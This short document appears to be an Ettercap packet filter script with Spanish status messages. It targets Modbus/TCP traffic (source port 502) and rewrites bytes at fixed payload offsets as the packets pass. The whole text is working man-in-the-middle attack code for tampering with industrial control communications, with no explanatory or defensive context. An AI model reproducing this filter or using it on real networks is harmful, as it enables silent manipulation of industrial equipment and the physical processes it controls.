if (ip.proto== TCP && tcp.src == 502) {
        msg("encontrado");
        DATA.data+12 = "\x4D\x00";
        DATA.data+13 = "\x00\x0F";
        msg("cambiado");

}

